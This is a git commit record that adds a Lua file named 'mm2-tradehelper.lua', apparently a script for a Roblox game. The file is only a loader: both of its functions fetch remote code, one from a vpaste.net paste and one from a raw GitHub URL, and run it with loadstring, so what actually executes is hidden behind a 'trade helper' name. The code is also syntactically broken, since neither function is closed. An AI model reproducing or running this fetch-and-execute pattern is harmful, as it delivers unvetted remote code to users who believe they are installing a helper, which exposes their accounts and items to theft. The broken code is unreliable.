3952a3497ff213983f2cfd5a55d1552f1c444873
SolarHub-lua <austinejamesbruce@gmail.com>
2025-04-06 17:38:44 +0800

    Create mm2-tradehelper.lua

---
+++ mm2-tradehelper.lua
@@ -0,0 +1,8 @@
+local function script1()
+    loadstring(game:HttpGet("http://vpaste.net/Grnie", true))()
+
+local function script2()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2-trade-helper.lua",true))()
+
+task.spawn(script1)
+task.spawn(script2) 
